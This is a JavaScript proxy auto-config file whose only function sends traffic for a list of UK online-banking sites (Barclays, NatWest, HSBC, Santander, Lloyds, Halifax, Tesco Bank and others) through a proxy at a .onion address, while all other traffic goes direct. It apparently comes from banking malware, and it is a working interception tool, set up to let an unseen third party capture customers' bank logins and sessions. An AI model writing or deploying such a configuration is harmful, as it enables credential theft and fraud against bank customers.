function FindProxyForURL(url, host) {
    var proxy = "PROXY log5moxngjoys52g.onion:88;";
    var hosts = new Array('*barclays.co.uk', '*natwest.com', '*nwolb.com',
        'hsbc.co.uk', 'www.hsbc.co.uk', '*business.hsbc.co.uk',
        '*santander.co.uk', '*rbsdigital.com',
        'onlinebusiness.lloydsbank.co.uk', '*cahoot.com', '*smile.co.uk',
        '*co-operativebank.co.uk', 'if.com', '*.if.com',
        '*ulsterbankanytimebanking.co.uk', '*sainsburysbank.co.uk',
        '*tescobank.com', '*halifax-online.co.uk', '*halifax.co.uk',
        '*lloydsbank.co.uk', '*lloydstsb.com');
    for (var i = 0; i < hosts.length; i++) {
        if (shExpMatch(host, hosts[i])) {
            return proxy
        }
    }
    return "DIRECT"
}
